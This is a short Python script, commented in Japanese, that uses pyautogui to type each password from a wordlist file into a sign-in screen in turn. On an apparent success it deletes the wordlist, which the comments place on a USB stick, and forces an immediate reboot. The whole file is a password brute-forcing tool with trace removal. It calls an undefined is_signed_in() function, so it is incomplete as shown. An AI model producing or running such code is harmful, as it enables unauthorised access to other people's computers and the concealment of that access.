import os
import pyautogui
import time

# パスワードファイルのパス
password_file_path = "password.txt"

# パスワードファイルからパスワードを読み込む
with open(password_file_path, "r") as f:
    passwords = f.readlines()

# 各パスワードを順番に試す
for password in passwords:
    # パスワードを入力
    pyautogui.write(password.strip())  # 改行文字を除去して入力
    pyautogui.press("enter")
    
    # サインイン画面が閉じるか、一定時間待つ
    time.sleep(5)
    
    # パスワードが正しくない場合、次のパスワードを試す
    if not is_signed_in():  # サインインが成功したかどうかを判定する関数が必要
        continue
    
    # 正しいパスワードでログインできた場合、USBメモリ内のファイルを削除して終了
    os.remove(password_file_path)
    os.system("shutdown /r /t 0")
    break
else:
    print("すべてのパスワードが間違っています。")